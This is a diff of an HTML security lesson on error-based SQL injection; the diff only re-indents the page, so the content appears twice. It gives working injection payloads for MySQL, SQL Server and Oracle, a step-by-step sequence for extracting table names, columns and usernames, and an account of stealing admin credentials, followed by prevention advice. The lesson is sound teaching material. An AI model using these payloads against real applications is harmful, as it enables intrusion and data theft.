@@ -1,360 +1,350 @@
-<div class="lesson-view-content">
-  <h1>Error-Based SQL Injection</h1>
+<h1>Error-Based SQL Injection</h1>
 
-  <div class="definition-box">
-    <h2>What is Error-Based SQL Injection?</h2>
-    <p>
-      Error-based SQL injection is a technique that forces the database to
-      generate error messages that contain useful information. The attacker
-      deliberately creates SQL syntax errors or logical conditions that cause
-      the database to throw errors. When these error messages are displayed to
-      the user, they can leak sensitive data such as table names, column names,
-      or even actual data values from the database.
-    </p>
-  </div>
-
-  <h2>How Error-Based Injection Works</h2>
-  <p>Error-based SQL injection relies on three key factors:</p>
-  <ol>
-    <li>The application contains SQL injection vulnerabilities</li>
-    <li>The application displays database error messages to the user</li>
-    <li>
-      The attacker can manipulate input to trigger informative error messages
-    </li>
-  </ol>
-
-  <div class="example-box">
-    <h3>Basic Error-Based Attack:</h3>
-    <p>Consider a URL vulnerable to SQL injection:</p>
-    <p><code>https://example.com/products?id=10</code></p>
-    <p>An attacker might try:</p>
-    <p><code>https://example.com/products?id=10'</code></p>
-    <p>This additional single quote might trigger an error such as:</p>
-    <p>
-      <code>
-        You have an error in your SQL syntax; check the manual that corresponds
-        to your MySQL server version for the right syntax to use near ''10'' at
-        line 1
-      </code>
-    </p>
-    <p>
-      This confirms SQL injection is possible and reveals the database type
-      (MySQL).
-    </p>
-  </div>
-
-  <h2>Common Error-Based Techniques</h2>
+<div class="definition-box">
+  <h2>What is Error-Based SQL Injection?</h2>
   <p>
-    Several database-specific functions and operators can be used to extract
-    data through errors:
+    Error-based SQL injection is a technique that forces the database to
+    generate error messages that contain useful information. The attacker
+    deliberately creates SQL syntax errors or logical conditions that cause the
+    database to throw errors. When these error messages are displayed to the
+    user, they can leak sensitive data such as table names, column names, or
+    even actual data values from the database.
   </p>
+</div>
 
-  <h3>MySQL/MariaDB Techniques</h3>
-  <ul>
-    <li>
-      <strong>extractvalue()</strong> - XML function that can be abused to
-      trigger XPath errors
-    </li>
-    <li>
-      <strong>updatexml()</strong> - Another XML function useful for error-based
-      extraction
-    </li>
-    <li>
-      <strong>DOUBLE conversion errors</strong> - Converting incompatible data
-      to reveal contents
-    </li>
-    <li>
-      <strong>GROUP BY errors</strong> - Using GROUP BY clause with incorrect
-      parameters
-    </li>
-  </ul>
+<h2>How Error-Based Injection Works</h2>
+<p>Error-based SQL injection relies on three key factors:</p>
+<ol>
+  <li>The application contains SQL injection vulnerabilities</li>
+  <li>The application displays database error messages to the user</li>
+  <li>
+    The attacker can manipulate input to trigger informative error messages
+  </li>
+</ol>
 
-  <div class="example-box">
-    <h3>MySQL extractvalue() Example:</h3>
-    <p>
-      <code
-        >id=10 AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))</code
-      >
-    </p>
-    <p>This produces an error like:</p>
-    <p>
-      <code
-        >ERROR 1105 (HY000): XPATH syntax error:
-        '~5.7.31-0ubuntu0.18.04.1~'</code
-      >
-    </p>
-    <p>The error message reveals the MySQL version (5.7.31).</p>
-  </div>
-
-  <h3>SQL Server Techniques</h3>
-  <ul>
-    <li>
-      <strong>CONVERT() errors</strong> - Type conversion errors that display
-      data
-    </li>
-    <li>
-      <strong>Error concatenation</strong> - Using arithmetic operations to
-      trigger errors
-    </li>
-    <li>
-      <strong>XML parsing errors</strong> - Manipulating XML functions to leak
-      data
-    </li>
-  </ul>
-
-  <div class="example-box">
-    <h3>SQL Server CONVERT() Example:</h3>
-    <p><code>id=10 AND CONVERT(int, (SELECT @@version)) > 0</code></p>
-    <p>This produces an error like:</p>
-    <p>
-      <code>
-        Error converting data type nvarchar to int. Microsoft SQL Server 2019
-        (RTM-CU8) (KB4577194) - 15.0.4073.23 (X64)
-      </code>
-    </p>
-    <p>The error reveals the exact SQL Server version.</p>
-  </div>
-
-  <h3>Oracle Techniques</h3>
-  <ul>
-    <li><strong>CTXSYS.DRITHSX.SN</strong> - Using Oracle Text functions</li>
-    <li><strong>XML parsing errors</strong> - Exploiting XML functions</li>
-    <li><strong>UTL_INADDR.GET_HOST_NAME</strong> - Network function errors</li>
-  </ul>
-
-  <div class="example-box">
-    <h3>Oracle Error Example:</h3>
-    <p>
-      <code
-        >id=10 AND CAST((SELECT banner FROM v$version WHERE rownum=1) AS
-        varchar2(10))</code
-      >
-    </p>
-    <p>This produces an error like:</p>
-    <p>
-      <code>
-        ORA-06502: PL/SQL: numeric or value error: character string buffer too
-        small Oracle Database 19c Enterprise Edition Release 19.0.0.0.0
-      </code>
-    </p>
-    <p>The error reveals the Oracle version information.</p>
-  </div>
-
-  <h2>PostgreSQL Techniques</h2>
-  <ul>
-    <li><strong>CAST errors</strong> - Type conversion errors</li>
-    <li>
-      <strong>Numeric operations</strong> - Division by zero and other
-      mathematical errors
-    </li>
-  </ul>
-
-  <div class="danger-box">
-    <h3>Verbose Error Messages</h3>
-    <p>
-      When database error messages are directly displayed to users, they can
-      reveal significant information about the database structure, query logic,
-      and even sensitive data values. This is why production environments should
-      never display raw database error messages to end users.
-    </p>
-  </div>
-
-  <h2>Extracting Data Step by Step</h2>
-  <p>
-    A systematic approach to error-based extraction typically follows these
-    steps:
-  </p>
-  <ol>
-    <li>
-      <strong>Confirm vulnerability</strong> - Test for SQL injection with
-      syntax errors
-    </li>
-    <li>
-      <strong>Identify DBMS</strong> - Determine the database type from error
-      messages
-    </li>
-    <li>
-      <strong>Extract database version</strong> - Use version-specific functions
-    </li>
-    <li>
-      <strong>Enumerate database names</strong> - Extract database schema
-      information
-    </li>
-    <li><strong>Enumerate table names</strong> - Discover table structures</li>
-    <li>
-      <strong>Enumerate column names</strong> - Identify columns of interest
-    </li>
-    <li>
-      <strong>Extract actual data</strong> - Retrieve sensitive information
-    </li>
-  </ol>
-
-  <div class="example-box">
-    <h3>MySQL Data Extraction Sequence:</h3>
-    <p>1. Get database name:</p>
-    <p>
-      <code
-        >id=10 AND extractvalue(1, concat(0x7e, (SELECT database()),
-        0x7e))</code
-      >
-    </p>
-    <p>Error: <code>XPATH syntax error: '~myappdb~'</code></p>
-
-    <p>2. Get table names:</p>
-    <p>
-      <code
-        >id=10 AND extractvalue(1, concat(0x7e, (SELECT table_name FROM
-        information_schema.tables WHERE table_schema='myappdb' LIMIT 0,1),
-        0x7e))</code
-      >
-    </p>
-    <p>Error: <code>XPATH syntax error: '~users~'</code></p>
-
-    <p>3. Get column names:</p>
-    <p>
-      <code
-        >id=10 AND extractvalue(1, concat(0x7e, (SELECT column_name FROM
-        information_schema.columns WHERE table_name='users' LIMIT 0,1),
-        0x7e))</code
-      >
-    </p>
-    <p>Error: <code>XPATH syntax error: '~user_id~'</code></p>
-
-    <p>4. Extract data:</p>
-    <p>
-      <code
-        >id=10 AND extractvalue(1, concat(0x7e, (SELECT username FROM users
-        LIMIT 0,1), 0x7e))</code
-      >
-    </p>
-    <p>Error: <code>XPATH syntax error: '~admin~'</code></p>
-  </div>
-
-  <h2>Automating Data Extraction</h2>
-  <p>
-    For extensive data extraction, attackers use techniques to retrieve multiple
-    values:
-  </p>
-  <ul>
-    <li>
-      <strong>Pagination techniques</strong> - Using LIMIT and OFFSET to iterate
-      through results
-    </li>
-    <li>
-      <strong>String concatenation</strong> - Combining multiple values into a
-      single output
-    </li>
-    <li><strong>Custom scripts</strong> - Automating the extraction process</li>
-  </ul>
-
-  <p>Example for extracting multiple rows:</p>
+<div class="example-box">
+  <h3>Basic Error-Based Attack:</h3>
+  <p>Consider a URL vulnerable to SQL injection:</p>
+  <p><code>https://example.com/products?id=10</code></p>
+  <p>An attacker might try:</p>
+  <p><code>https://example.com/products?id=10'</code></p>
+  <p>This additional single quote might trigger an error such as:</p>
   <p>
     <code>
-      # First row<br />
-      id=10 AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT
-      0,1), 0x7e))<br />
-      # Second row<br />
-      id=10 AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT
-      1,1), 0x7e))<br />
-      # And so on...
+      You have an error in your SQL syntax; check the manual that corresponds to
+      your MySQL server version for the right syntax to use near ''10'' at line
+      1
     </code>
   </p>
+  <p>
+    This confirms SQL injection is possible and reveals the database type
+    (MySQL).
+  </p>
+</div>
 
-  <div class="danger-box">
-    <h3>Character Limits</h3>
-    <p>
-      Many error-based extraction methods have character limits on the data that
-      can be extracted in a single query. Attackers overcome this by using
-      string functions like SUBSTRING() to extract data in smaller chunks or by
-      using bit-by-bit extraction techniques.
-    </p>
-  </div>
+<h2>Common Error-Based Techniques</h2>
+<p>
+  Several database-specific functions and operators can be used to extract data
+  through errors:
+</p>
 
-  <h2>Real-World Example</h2>
-  <p>A real vulnerability discovered in a web application:</p>
-  <ol>
-    <li>The app had a search function: <code>search.php?term=keyword</code></li>
-    <li>
-      Testing revealed SQL injection:
-      <code>search.php?term=keyword'</code> produced database errors
-    </li>
-    <li>
-      An attacker used:
-      <code
-        >search.php?term=keyword' AND updatexml(1,concat(0x7e,(SELECT
-        version()),0x7e),0)-- -</code
-      >
-    </li>
-    <li>
-      The error revealed MySQL version:
-      <code>XPATH syntax error: '~5.7.34~'</code>
-    </li>
-    <li>
-      Further queries extracted user table data including admin credentials
-    </li>
-    <li>The attacker gained administrative access to the application</li>
-  </ol>
+<h3>MySQL/MariaDB Techniques</h3>
+<ul>
+  <li>
+    <strong>extractvalue()</strong> - XML function that can be abused to trigger
+    XPath errors
+  </li>
+  <li>
+    <strong>updatexml()</strong> - Another XML function useful for error-based
+    extraction
+  </li>
+  <li>
+    <strong>DOUBLE conversion errors</strong> - Converting incompatible data to
+    reveal contents
+  </li>
+  <li>
+    <strong>GROUP BY errors</strong> - Using GROUP BY clause with incorrect
+    parameters
+  </li>
+</ul>
 
-  <h2>Prevention Techniques</h2>
-  <p>To prevent error-based SQL injection:</p>
-  <ol>
-    <li>
-      <strong>Use Parameterized Queries</strong> - Never concatenate user input
-      directly into SQL
-    </li>
-    <li>
-      <strong>Hide Error Messages</strong> - Display generic error messages to
-      users, log details securely
-    </li>
-    <li>
-      <strong>Implement Input Validation</strong> - Validate and sanitize all
-      user inputs
-    </li>
-    <li>
-      <strong>Apply Least Privilege</strong> - Limit database user permissions
-    </li>
-    <li>
-      <strong>Use ORMs</strong> - Modern object-relational mappers handle SQL
-      safely
-    </li>
-    <li>
-      <strong>Enable WAF Protection</strong> - Configure web application
-      firewalls to block suspicious patterns
-    </li>
-  </ol>
+<div class="example-box">
+  <h3>MySQL extractvalue() Example:</h3>
+  <p>
+    <code
+      >id=10 AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))</code
+    >
+  </p>
+  <p>This produces an error like:</p>
+  <p>
+    <code
+      >ERROR 1105 (HY000): XPATH syntax error: '~5.7.31-0ubuntu0.18.04.1~'</code
+    >
+  </p>
+  <p>The error message reveals the MySQL version (5.7.31).</p>
+</div>
 
-  <div class="example-box">
-    <h3>Secure Error Handling:</h3>
-    <p>Instead of:</p>
-    <p>
-      <code>
-        try {<br />
-        // Execute query<br />
-        } catch (Exception e) {<br />
-        echo "Database error: " + e.getMessage();<br />
-        }
-      </code>
-    </p>
-    <p>Do this:</p>
-    <p>
-      <code>
-        try {<br />
-        // Execute query<br />
-        } catch (Exception e) {<br />
-        log.error("Database error: " + e.getMessage()); // Log the real error<br />
-        echo "An error occurred. Please contact support.";<br />
-        }
-      </code>
-    </p>
-  </div>
+<h3>SQL Server Techniques</h3>
+<ul>
+  <li>
+    <strong>CONVERT() errors</strong> - Type conversion errors that display data
+  </li>
+  <li>
+    <strong>Error concatenation</strong> - Using arithmetic operations to
+    trigger errors
+  </li>
+  <li>
+    <strong>XML parsing errors</strong> - Manipulating XML functions to leak
+    data
+  </li>
+</ul>
 
-  <div class="danger-box">
-    <h3>Two-Layer Defense</h3>
-    <p>
-      For maximum protection against error-based SQL injection, implement both
-      preventive measures (parameterized queries) and defensive measures (error
-      handling). This ensures that even if an injection attempt occurs,
-      attackers cannot leverage error messages to extract information.
-    </p>
-  </div>
+<div class="example-box">
+  <h3>SQL Server CONVERT() Example:</h3>
+  <p><code>id=10 AND CONVERT(int, (SELECT @@version)) > 0</code></p>
+  <p>This produces an error like:</p>
+  <p>
+    <code>
+      Error converting data type nvarchar to int. Microsoft SQL Server 2019
+      (RTM-CU8) (KB4577194) - 15.0.4073.23 (X64)
+    </code>
+  </p>
+  <p>The error reveals the exact SQL Server version.</p>
+</div>
+
+<h3>Oracle Techniques</h3>
+<ul>
+  <li><strong>CTXSYS.DRITHSX.SN</strong> - Using Oracle Text functions</li>
+  <li><strong>XML parsing errors</strong> - Exploiting XML functions</li>
+  <li><strong>UTL_INADDR.GET_HOST_NAME</strong> - Network function errors</li>
+</ul>
+
+<div class="example-box">
+  <h3>Oracle Error Example:</h3>
+  <p>
+    <code
+      >id=10 AND CAST((SELECT banner FROM v$version WHERE rownum=1) AS
+      varchar2(10))</code
+    >
+  </p>
+  <p>This produces an error like:</p>
+  <p>
+    <code>
+      ORA-06502: PL/SQL: numeric or value error: character string buffer too
+      small Oracle Database 19c Enterprise Edition Release 19.0.0.0.0
+    </code>
+  </p>
+  <p>The error reveals the Oracle version information.</p>
+</div>
+
+<h2>PostgreSQL Techniques</h2>
+<ul>
+  <li><strong>CAST errors</strong> - Type conversion errors</li>
+  <li>
+    <strong>Numeric operations</strong> - Division by zero and other
+    mathematical errors
+  </li>
+</ul>
+
+<div class="danger-box">
+  <h3>Verbose Error Messages</h3>
+  <p>
+    When database error messages are directly displayed to users, they can
+    reveal significant information about the database structure, query logic,
+    and even sensitive data values. This is why production environments should
+    never display raw database error messages to end users.
+  </p>
+</div>
+
+<h2>Extracting Data Step by Step</h2>
+<p>
+  A systematic approach to error-based extraction typically follows these steps:
+</p>
+<ol>
+  <li>
+    <strong>Confirm vulnerability</strong> - Test for SQL injection with syntax
+    errors
+  </li>
+  <li>
+    <strong>Identify DBMS</strong> - Determine the database type from error
+    messages
+  </li>
+  <li>
+    <strong>Extract database version</strong> - Use version-specific functions
+  </li>
+  <li>
+    <strong>Enumerate database names</strong> - Extract database schema
+    information
+  </li>
+  <li><strong>Enumerate table names</strong> - Discover table structures</li>
+  <li>
+    <strong>Enumerate column names</strong> - Identify columns of interest
+  </li>
+  <li><strong>Extract actual data</strong> - Retrieve sensitive information</li>
+</ol>
+
+<div class="example-box">
+  <h3>MySQL Data Extraction Sequence:</h3>
+  <p>1. Get database name:</p>
+  <p>
+    <code
+      >id=10 AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))</code
+    >
+  </p>
+  <p>Error: <code>XPATH syntax error: '~myappdb~'</code></p>
+
+  <p>2. Get table names:</p>
+  <p>
+    <code
+      >id=10 AND extractvalue(1, concat(0x7e, (SELECT table_name FROM
+      information_schema.tables WHERE table_schema='myappdb' LIMIT 0,1),
+      0x7e))</code
+    >
+  </p>
+  <p>Error: <code>XPATH syntax error: '~users~'</code></p>
+
+  <p>3. Get column names:</p>
+  <p>
+    <code
+      >id=10 AND extractvalue(1, concat(0x7e, (SELECT column_name FROM
+      information_schema.columns WHERE table_name='users' LIMIT 0,1),
+      0x7e))</code
+    >
+  </p>
+  <p>Error: <code>XPATH syntax error: '~user_id~'</code></p>
+
+  <p>4. Extract data:</p>
+  <p>
+    <code
+      >id=10 AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT
+      0,1), 0x7e))</code
+    >
+  </p>
+  <p>Error: <code>XPATH syntax error: '~admin~'</code></p>
+</div>
+
+<h2>Automating Data Extraction</h2>
+<p>
+  For extensive data extraction, attackers use techniques to retrieve multiple
+  values:
+</p>
+<ul>
+  <li>
+    <strong>Pagination techniques</strong> - Using LIMIT and OFFSET to iterate
+    through results
+  </li>
+  <li>
+    <strong>String concatenation</strong> - Combining multiple values into a
+    single output
+  </li>
+  <li><strong>Custom scripts</strong> - Automating the extraction process</li>
+</ul>
+
+<p>Example for extracting multiple rows:</p>
+<p>
+  <code>
+    # First row<br />
+    id=10 AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT
+    0,1), 0x7e))<br />
+    # Second row<br />
+    id=10 AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT
+    1,1), 0x7e))<br />
+    # And so on...
+  </code>
+</p>
+
+<div class="danger-box">
+  <h3>Character Limits</h3>
+  <p>
+    Many error-based extraction methods have character limits on the data that
+    can be extracted in a single query. Attackers overcome this by using string
+    functions like SUBSTRING() to extract data in smaller chunks or by using
+    bit-by-bit extraction techniques.
+  </p>
+</div>
+
+<h2>Real-World Example</h2>
+<p>A real vulnerability discovered in a web application:</p>
+<ol>
+  <li>The app had a search function: <code>search.php?term=keyword</code></li>
+  <li>
+    Testing revealed SQL injection:
+    <code>search.php?term=keyword'</code> produced database errors
+  </li>
+  <li>
+    An attacker used:
+    <code
+      >search.php?term=keyword' AND updatexml(1,concat(0x7e,(SELECT
+      version()),0x7e),0)-- -</code
+    >
+  </li>
+  <li>
+    The error revealed MySQL version:
+    <code>XPATH syntax error: '~5.7.34~'</code>
+  </li>
+  <li>Further queries extracted user table data including admin credentials</li>
+  <li>The attacker gained administrative access to the application</li>
+</ol>
+
+<h2>Prevention Techniques</h2>
+<p>To prevent error-based SQL injection:</p>
+<ol>
+  <li>
+    <strong>Use Parameterized Queries</strong> - Never concatenate user input
+    directly into SQL
+  </li>
+  <li>
+    <strong>Hide Error Messages</strong> - Display generic error messages to
+    users, log details securely
+  </li>
+  <li>
+    <strong>Implement Input Validation</strong> - Validate and sanitize all user
+    inputs
+  </li>
+  <li>
+    <strong>Apply Least Privilege</strong> - Limit database user permissions
+  </li>
+  <li>
+    <strong>Use ORMs</strong> - Modern object-relational mappers handle SQL
+    safely
+  </li>
+  <li>
+    <strong>Enable WAF Protection</strong> - Configure web application firewalls
+    to block suspicious patterns
+  </li>
+</ol>
+
+<div class="example-box">
+  <h3>Secure Error Handling:</h3>
+  <p>Instead of:</p>
+  <p>
+    <code>
+      try {<br />
+      // Execute query<br />
+      } catch (Exception e) {<br />
+      echo "Database error: " + e.getMessage();<br />
+      }
+    </code>
+  </p>
+  <p>Do this:</p>
+  <p>
+    <code>
+      try {<br />
+      // Execute query<br />
+      } catch (Exception e) {<br />
+      log.error("Database error: " + e.getMessage()); // Log the real error<br />
+      echo "An error occurred. Please contact support.";<br />
+      }
+    </code>
+  </p>
+</div>
+
+<div class="danger-box">
+  <h3>Two-Layer Defense</h3>
+  <p>
+    For maximum protection against error-based SQL injection, implement both
+    preventive measures (parameterized queries) and defensive measures (error
+    handling). This ensures that even if an injection attempt occurs, attackers
+    cannot leverage error messages to extract information.
+  </p>
 </div>
